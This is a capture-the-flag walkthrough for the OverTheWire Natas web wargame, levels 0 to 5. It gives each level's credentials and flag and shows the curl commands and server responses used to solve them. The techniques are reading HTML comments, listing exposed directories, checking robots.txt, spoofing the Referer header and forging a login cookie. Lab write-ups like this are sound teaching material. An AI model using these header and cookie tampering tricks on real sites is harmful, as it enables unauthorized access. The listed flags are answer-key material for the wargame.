# Natas

## Natas0

*	user: `natas0`
*	pass: `natas0`
*	url: `http://natas0.natas.labs.overthewire.org`
*	flag: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`	

### Procedure

1.	Get the page's source (e.g. `CTRL+U` on FF)

2.	Look the HTML comment at line 16

		<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->

## Natas1

*	user: `natas1`
*	pass: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`
*	url: `http://natas1.natas.labs.overthewire.org`
*	flag: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`	

### Procedure

1.	Get the page's source (e.g. `CTRL+U` on FF)

2.	Look the HTML comment at line 17

		<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->

## Natas2

*	user: `natas2`
*	pass: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`
*	url: `http://natas2.natas.labs.overthewire.org`
*	flag: `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

### Procedure

1.	Get the page's source (e.g. `CTRL+U` on FF)

2.	Statement *There is nothing on this page* is false! What about `<img>` tag?

		<img src="files/pixel.png">

3.	The image seems to be a one pixel image without any relevat info. Let's try
	if the URL `http://natas2.natas.labs.overthewire.or/files` give us
	something...

4.	BINGO! The `/files` path is listable and we can see an interesting file
	named `users.txt`. Let's try to get its conent...

		$ curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt
		# username:password
		alice:BYNdCesZqW
		bob:jw2ueICLvT
		charlie:G5vCxkVV3m
		natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
		eve:zo4mJWyNj2
		mallory:9urtcpzBmH

## Natas3

*	user: `natas3`
*	pass: `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`
*	url: `http://natas3.natas.labs.overthewire.org`
*	flag: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

### Procedure

1.	Get the page's source (e.g. `CTRL+U` on FF)

2.	At line 15, there is an HTML comment with a hint (*Not even Google will
	find it this time...*).

3.	How to disable page indexing? Simple! Use `Disallow` directive in
	`robots.txt` file. Let's try if it's available

		$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
		User-agent: *
		Disallow: /s3cr3t/

4.	Let's try to list `/s3cr3t/` path. Yep! Another `users.txt` file

		$ curl -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
		natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

## Natas4

*	user: `natas4`
*	pass: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`
*	url: `http://natas4.natas.labs.overthewire.org`
*	flag: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

### Procedure

1.	By getting the page's source code, we can see that there's nothing
	interesting. By clicking on `Refresh page`, page content changes from

		Access disallowed. You are visiting from "" while [...]

	to

		Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while [...]

	then if newly click on `Refresh page` it changes in

		Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while [...]

	Seems that it's related to `Referer` HTTP header. Indeed, by repeating the
	procedure with a sniffer, we can see that `Referer` header is set.

2.	The page suggests us that *authorized users should come only from [...]*.
	Let's try to set the `Referer` header to desired value
	(`http://natas5.natas.labs.overthewire.org/`)

		$ curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
		<body>
		<h1>natas4</h1>
		<div id="content">

		Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
		<br/>
		<div id="viewsource"><a href="index.php">Refresh page</a></div>
		</div>
		</body>
		</html>

## Natas5

*	user: `natas5`
*	pass: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`
*	url: `http://natas5.natas.labs.overthewire.org`
*	flag: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

### Procedure

1.	When accessing the page, the following message is received

		Access disallowed. You are not logged in

	It's common to use cookies to check if a user is logged in. So let's try
	with a sniffer (e.g. Wireshark) if specific cookie is required.

2.	Bingo! When page is accessed, cookie `loggedin=0` is sent. Let's try to
	change it in 1

		$ curl -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -b loggedin=1 http://natas5.natas.labs.overthewire.org/
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
		<body>
		<h1>natas5</h1>
		<div id="content">
		Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
		</body>
		</html>

	Seems to work...

## Natas6

*	user: `natas6`
*	pass: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`
*	url: `http://natas6.natas.labs.overthewire.org`
*	flag: `???`

